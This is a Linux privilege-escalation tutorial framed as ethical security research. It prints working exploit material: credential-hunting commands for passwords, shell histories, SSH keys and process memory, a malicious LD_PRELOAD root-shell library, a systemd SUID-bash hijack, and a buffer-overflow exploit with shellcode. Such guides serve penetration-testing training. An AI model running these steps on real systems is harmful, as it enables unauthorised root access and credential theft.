# Advanced Linux Privilege Escalation Methodology

This guide provides a comprehensive, in-depth methodology for Linux privilege escalation, intended for educational and ethical security research. It assumes a foundational understanding of the basics and focuses on more advanced and nuanced techniques.

---

## ## 1. Advanced Enumeration & Situational Awareness

Advanced exploitation requires advanced enumeration. Go beyond the basics and understand the system's live behavior and subtle configurations.

### ### Live Process Monitoring
* **Purpose:** Basic `ps aux` only gives a snapshot. Live monitoring can reveal cron jobs as they execute, privileged scripts being run by other users, or applications processing user-controlled data.
* **Tool: pspy** (https://github.com/DominicBreuker/pspy)
* **Commands:**
    ```bash
    # Monitor all processes, showing file system events
    ./pspy64 -pf -i 1000
    ```

### ### Deep Filesystem & Credential Analysis
* **Purpose:** Find credentials, API keys, and configuration secrets that automated scripts might miss.
* **Commands:**
    ```bash
    # Recursively find all files owned by a user, looking for config files
    find / -user <username> -ls 2>/dev/null | grep '\.conf'

    # Search for password patterns inside all readable files
    grep -rli "password" / 2>/dev/null

    # Check all shell history files, not just your own
    find / -name ".*_history" -ls 2>/dev/null | xargs -I {} cat {} | grep -E "(sudo|su|passwd)"

    # Look for SSH keys and check their permissions
    find / -name "id_rsa" -ls 2>/dev/null

    # Look for KeePass password databases
    find / -name "*.kdbx" -ls 2>/dev/null
    ```

### ### Container & Namespace Enumeration
* **Purpose:** Determine if you are inside a container (like Docker, LXC) and identify potential escape vectors.
* **Commands:**
    ```bash
    # Check the cgroups, a strong indicator of being in a container
    cat /proc/1/cgroup

    # The '.dockerenv' file exists at the root of Docker containers
    ls -l /.dockerenv

    # Check for capabilities, which are often restricted in containers
    capsh --print
    ```

---

## ## 2. Sudo & SUID/SGID Deep Dives

Go beyond GTFOBins by exploiting the environment and interactions of privileged binaries.

### ### Advanced Sudo Abuse: LD_PRELOAD
* **What it is:** If `sudo -l` shows that the `LD_PRELOAD` environment variable is preserved, you can force a command run via `sudo` to load a malicious shared library before any others, executing your code as root.
* **Find:**
    ```bash
    sudo -l | grep "env_keep.*LD_PRELOAD"
    ```
* **Exploit:**
    1.  Create a malicious shared library C file (`preload.c`):
        ```c
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
            unsetenv("LD_PRELOAD");
            setgid(0);
            setuid(0);
            system("/bin/bash -p");
        }
        ```
    2.  Compile it:
        ```bash
        gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /path/to/preload.c
        ```
    3.  Run a sudo command with `LD_PRELOAD` pointing to your library:
        ```bash
        sudo LD_PRELOAD=/tmp/preload.so <command_from_sudo_-l>
        ```

### ### Advanced SUID Abuse: Shared Object Hijacking
* **What it is:** An SUID binary might try to load a shared library (`.so` file) that doesn't exist or is located in a path where you have write permissions.
* **Find:** Use `strace` to monitor an SUID binary for library loading attempts that result in `ENOENT` (No such file or directory) in a writable path.
    ```bash
    strace -v -f -e 'trace=openat' /path/to/suid_binary 2>&1 | grep -i "enoent"
    ```
* **Exploit:** If a missing library is found in a writable path (e.g., `/home/user/lib/missing.so`), create a malicious library with the same exploitation code as `LD_PRELOAD`, compile it, and place it at that location. The next time the SUID binary is run, it will load your library and execute your code as root.

---

## ## 3. Abusing Modern Linux Features

Exploiting newer, complex systems like Polkit and Systemd.

### ### Polkit (pkexec) Abuse
* **What it is:** Polkit is a system-wide authorization framework. Misconfigured Polkit rules can allow a user in a specific group (or sometimes any user) to execute commands as another user, including root, without a password. The PwnKit vulnerability (CVE-2021-4034) is a famous example of a bug in Polkit itself.
* **Find:** Enumerate Polkit rules. Look for actions that can be performed by your user and have `<allow_any>`, `<allow_active>`, or `<allow_inactive>` set to `yes`.
    ```bash
    # Check for pkaction details
    pkaction
    ```
* **Exploit:** If a rule allows you to, for instance, manage a system service, you could use `pkexec` to run the service management command with arguments that spawn a shell.
    ```bash
    # Example for a hypothetical vulnerable action 'com.example.service.manage'
    pkexec /usr/sbin/service some-service start-debug-shell
    ```

### ### Systemd Timers & Services
* **What it is:** Systemd timers are the modern replacement for cron jobs. If a timer's associated service unit file is writable, or if it runs a script that is writable, it can be hijacked.
* **Find:**
    ```bash
    # List all system timers
    systemctl list-timers --all

    # Examine the service file associated with a timer that runs as root
    systemctl cat <service_name>.service

    # Check permissions on the service file and the ExecStart script
    ls -l /etc/systemd/system/<service_name>.service
    ls -l /path/to/script
    ```
* **Exploit:** If the service file itself is writable, modify the `ExecStart=` line to execute your payload. If the script is writable, overwrite it.
    ```bash
    # Example of editing a writable service file
    # Change 'ExecStart=/usr/local/bin/backup.sh' to:
    ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
    ```

---

## ## 4. Advanced Binary & Memory Exploitation

Low-level techniques for when misconfigurations are not present.

### ### Simple Buffer Overflow in an SUID Binary
* **What it is:** A custom SUID binary has a buffer overflow vulnerability, allowing you to overwrite the instruction pointer (EIP) and redirect execution to your own shellcode. **Note: This requires a non-PIE binary and no stack canaries.**
* **Vulnerable C Code Example (`vuln.c`):**
    ```c
    #include <stdio.h>
    #include <string.h>

    int main(int argc, char** argv) {
        char buffer[200];
        strcpy(buffer, argv[1]);
        return 0;
    }
    ```
    *Compile with:* `gcc -m32 -fno-stack-protector -z execstack -o vuln vuln.c; sudo chown root:root vuln; sudo chmod u+s vuln`
* **Exploit Steps:**
    1.  **Find the Offset:** Use `gdb-peda` to find the exact number of bytes to overwrite EIP.
        ```bash
        gdb-peda ./vuln
        pattern create 300
        run <pattern>
        # Note the EIP value, then find the offset:
        pattern offset <EIP_value> 
        ```
    2.  **Craft the Payload:**
        ```python
        # exploit.py
        import struct

        # Shellcode from msfvenom for execve("/bin/sh")
        shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        
        # Address to jump to (e.g., address of buffer). Find with 'info frame' in gdb.
        ret_addr = struct.pack("<I", 0xffffd6a0) 

        # Offset found in step 1 (e.g., 212)
        offset = 212
        nops = b"\x90" * (offset - len(shellcode))

        payload = nops + shellcode + ret_addr
        print(payload.decode('latin-1'))
        ```
    3.  **Execute:**
        ```bash
        ./vuln "$(python exploit.py)"
        ```

### ### Credential Hunting in Process Memory
* **What it is:** Sometimes processes (like a login daemon or application server) will temporarily hold plaintext credentials in their memory space. As root, you could inspect this, but even as a low-privilege user, you may be able to inspect memory of processes you own.
* **Find:** Look for processes you can debug or read the memory of.
    ```bash
    # GDB can attach to a running process you own
    gdb -p <PID>

    # (as root) Grep through the entire memory space of a process for password patterns
    cat /proc/<PID>/maps
    dd if=/proc/<PID>/mem bs=1M | grep "password"
    ```
